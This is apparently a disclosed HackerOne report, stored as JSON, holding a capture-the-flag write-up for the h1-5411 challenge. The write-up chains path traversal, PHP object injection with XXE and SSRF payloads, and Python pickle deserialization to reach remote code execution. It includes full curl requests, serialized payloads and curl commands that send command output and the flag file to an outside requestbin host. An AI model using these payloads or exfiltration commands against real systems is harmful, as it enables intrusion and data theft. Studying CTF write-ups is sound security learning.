@@ -1,0 +1,120 @@
+{
+  "id": 415202,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTUyMDI=",
+  "url": "https://hackerone.com/reports/415202",
+  "title": "Flag WriteUp",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-27T08:27:35.942Z",
+  "submitted_at": "2018-09-27T08:27:35.942Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "caioluders",
+    "url": "/caioluders",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/dj1bj162w9m51oskm97usq7dw652/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 33314,
+    "url": "https://hackerone.com/h1-5411-ctf",
+    "handle": "h1-5411-ctf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/033/314/9e31bd74c6486465dd01f5ef0a98eb4ebe1b6459_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/033/314/9e31bd74c6486465dd01f5ef0a98eb4ebe1b6459_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "h1-5411-CTF",
+      "twitter_handle": null,
+      "website": "http://tbd.com",
+      "about": null
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-10-22T17:06:23.721Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-10-22T17:06:23.654Z",
+  "team_member_agreed_on_going_public_at": "2018-10-22T16:02:31.257Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello everyone , here is my writeup :\n\n## Intro\nFirst I decoded the QR Code of the [tweet](https://twitter.com/Hacker0x01/status/1045075889120268289) , decoding to `Here you go: 68747470733a2f2f68312d353431312e68316374662e636f6d` . Decoding the hex value we get the challenge URL : https://h1-5411.h1ctf.com\n\n## Path traversal + local file read\n\nOn the website I found two important endpoints : /generate.php and /memes.php . At the generate.php I started doing some \"manual fuzzing\" trying some command injection, like `;)'\";|id`, and template injections like `{{7*7}}` but nothing seemed to work. \nAnalyzing the requests I see that the `template` parameter value is a filename , so I try a path traversal with `../../../../../../../etc/passwd` and I get rick rolled :'( But changing the parameter `type` to `text` works ! And I got the first vulnerability .\n\nPath Traversal in `template` parameter\n```\n$ curl 'https://h1-5411.h1ctf.com/api/generate.php' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:64.0) Gecko/20100101 Firefox/64.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://h1-5411.h1ctf.com/generate.php' -H 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=xxx' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data 'template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&type=text&top-text=a&bottom-text=b'\n{\"meme_path\":\"..\\/data\\/memes\\/1538028501-288459b55a1a4ed8bd893f971f758c2f5a6e0cae2c513d6ad9d971cd4a401f8b.txt\"}\n```\n/etc/passwd output\n```\n$ curl 'https://h1-5411.h1ctf.com/data/memes/1538028501-288459b55a1a4ed8bd893f971f758c2f5a6e0cae2c513d6ad9d971cd4a401f8b.txt'\n  A\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nu6488:x:6488:6488:,,,:/app:/bin/bash\ndyno:x:6488:6488:,,,:/app:/bin/bash\n\n  B\n```\n\nFirst I tried reading some default configurations files like /proc/self/environ and /proc/self/cmdline without any usable information.\nNow with file read I can read all the source code of the application. The default /var/www/html/index.php path works fine, that's good news ! Following the path I read generate.php and memes.php, followed by /includes/config.php and /includes/classes.php.\nOn classes.php we can see that's a class called `ConfigFile` that is not used anywhere and that the code enable external entities on XML with `libxml_disable_entity_loader(false);` showing that the next step is probably a XXE. \nWhile trying to figure out the next step I remembered that I haven't looked at the /includes/header.php file because I thought that it was useless. Turns out that it has the endpoints import_memes_2.0.php and export_memes_2.0.php on it's comments. \n\n## Object Injection + XXE + SSRF\nLooking at /api/import_memes_2.0.php it's visible that it receives a file that is base64 encoded and unserialize it. After that, it merges with the `$_SESSION['memes']` array. Now I have a clear way to Object Injection into the `ConfigFile` class, but how to exploit it?\nHaving in mind that we need to get a XXE somewhere, it's clear that we need to call the `parse` function in the class and initialize the class with the `$url` variable being the malicious XXE payload. The `parse` function is only called by `generate` and `__toString` , the latter is a magic function that is called whenever the class is interpreted as a string and that occurs on `memes.php` on the foreach loop.\n\nNow I have a idea how to exploit it.\nCreate a serialized array, because of the `array_merge()` , with an `ConfigFile` class initialized with a malicious XXE payload.\nAs it was late of night and I was really tired, I just created all by hand counting the length of the string and all.\n\nThe serialized class without the payload looks like this :\n```\na:3:{i:0;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:2:\"ab\";}}\n```\nNow I have to insert the XXE payload, note that it must have `toptext` or a `bottomtext` tag to output the result to the page, at first I tried a RCE payload with `expect://`.\n```\na:3:{i:0;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:167:\"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [ <!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"expect://id\" >]>\n<payload>\n    <toptext>&xxe;</toptext>\n</payload>\";}}\n```\nBut no output was generated, after that I tried to output the stdout to a server with `expect://curl http://requestbin.net/r/w8rpj9w8?a=$(id)` with no success. Turns out that to expect works the module must be loaded on the PHP.\nNow the only thing I can think is a SSRF, as I already have local file read. The next payload is a attempt to get the content of http://google.com\n```\na:3:{i:0;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:174:\"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [ <!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://google.com\" >]>\n<payload>\n    <toptext>&xxe;</topttext>\n</payload>\";}}\n```\nBut it failed again. As I couldn't think of any other way to complete the challenge, I tried another technique to achieve SSRF with `php://filter/read=convert.base64-encode/resource=http://google.com`.\n```\na:3:{i:0;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:222:\"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [ <!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=http://google.com\" >]>\n<payload>\n    <toptext>&xxe;</toptext>\n</payload>\";}}\n```\nAnd now it worked ! The base64 result was printed on the memes.php page, now I have SSRF.\nAfter that I tried the AWS metadata URL http://169.254.169.254/latest/user-data/ , because the server was on AWS to try to get any credentials, but it didn't work.\n\nSo it must be a internal IP. To find the IP:PORT I used the first local file read to read /proc/net/tcp \n```\nsl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     \n   0: 0100007F:0539 00000000:0000 0A 00000000:00000000 00:00000000 00000000  6488        0 2574392220 1 0000000000000000 100 0 0 10 0                \n   1: 9E3610AC:A862 5579F868:0016 01 00000000:00000000 02:000A25B2 00000000  6488        0 2574386053 2 0000000000000000 20 4 29 10 -1\n```\nDecoding the hex `0100007F:0539` we get 127.0.0.1:1337, so this must be the next step.\n\n## Pickle injection RCE\nUsing the SSRF to get the http://127.0.0.1:1337.\n```\nMeme Service - Internal Maintenance API - v0.1 (Alpha); API Documentation: Version 0.1 - Endpoints: /status - View maintenance status; /update-status Change maintenance status; Debug: The debug parameter allows debugging;\n```\nhttp://127.0.0.1:1337/status?debug=1\n```\nMaintenance mode: off | Debug: KGlhcHAKU3RhdHVzCnAxCihkcDIKUydtZXNzYWdlJwpwMwpTJ01haW50ZW5hbmNlIG1vZGU6IG9mZicKcDQKc1MnbWFpbnRlbmFuY2UnCnA1CkkwMApzYi4\n```\nSending the `?debug=1` to /status it shows a Python's Pickle serialized data encoded in base64.\n```\n(iapp\nStatus\np1\n(dp2\nS'message'\np3\nS'Maintenance mode: off'\np4\nsS'maintenance'\np5\nI00\ns\n```\nhttp://127.0.0.1:1337/update-status?debug=1\n```\nMissing status parameter\n```\nSo we have to send a status parameter\n\nhttp://127.0.0.1:1337/update-status?debug=1&status=hacked\n```\nInvalid status | Debug: Incorrect paddi\n```\nI tried to send the base64 he outputs on  the /status and it worked ! So I have to send a base64 encoded pickle object on the status parameter. \n\nPickle is notorious vulnerable to RCE, so I tried a simple exploit available at https://gist.github.com/0xBADCA7/f4c700fcbb5fb8785c14.\n```\n$ python pick.py | base64\nY3Bvc2l4CnN5c3RlbQpwMAooUydpZCcKcDEKdHAyClJwMwouCg==\n```\nSending this to `/update-status?debug=1&status=Y3Bvc2l4CnN5c3RlbQpwMAooUydpZCcKcDEKdHAyClJwMwouCg%3D%3D` showed\n```\nA new status has been loaded. Automatic reloading not implemented yet\n```\nBut no output. Changing the command to `curl http://requestbin.net/r/w8rpj9w8?c=$(id|base64)` sended the output to my server in a get .\n```\ndWlkPTEwMDAoaGFja2VyKSBnaWQ9MTAwMChoYWNrZXIpIGdyb3Vwcz0xMDAwKGhhY2tlcikK\n$ pbpaste | base64 --decode\nuid=1000(hacker) gid=1000(hacker) groups=1000(hacker)\n```\nTrying now a `$(ls|base64)`\n```\napp.py\napp.pyc\nflag.txt\nrequirements.txt\nstatic\nstatus.pi\n```\nAnd a `$(cat flag.txt|base64)`\n```\nYay! Here is your flag:\n\nflag{cha1n1ng_bugs_f0r_fun_4nd_\n```\nFor some reason the base64 is cutted out, but sending a sed command to get the third line `curl -d $(sed -n 3p flag.txt|base64) http://requestbin.net/r/w8rpj9w8` I get all the flag.\n```\nflag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}\n```\n\n## Impact\n\nThe impact of the challenge is to get me a ticket to h1-5411",
+  "weakness": {
+    "id": 54,
+    "name": "XML External Entities (XXE)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-11-21T16:02:31.326Z",
+  "allow_singular_disclosure_after": -235524051.90117812,
+  "singular_disclosure_allowed": true,
+  "vote_count": 15,
+  "voters": [
+    "0xacb",
+    "ali",
+    "eveeez",
+    "bb00x",
+    "r31dxtreme",
+    "japz",
+    "den1al",
+    "0xm1racle",
+    "spetr0x",
+    "maluma",
+    "and 5 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
